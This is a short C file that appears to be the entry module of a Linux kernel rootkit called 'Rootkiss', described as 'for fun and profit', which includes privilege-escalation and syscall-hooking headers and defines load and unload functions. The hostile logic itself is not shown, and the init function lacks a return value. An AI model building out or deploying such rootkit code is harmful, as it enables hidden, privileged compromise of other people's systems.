#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "headers/priv_esc.h"
#include "headers/syscall_hook.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yair Koskas");
MODULE_DESCRIPTION("Linux rootkit for fun and profit");


int __init rootkiss_init(void) {
	printk(KERN_INFO "Loaded Rootkiss");
}

void __exit rootkiss_exit(void) {
	restore_all_syscalls();
	printk(KERN_INFO "Unloaded Rootkiss");
}
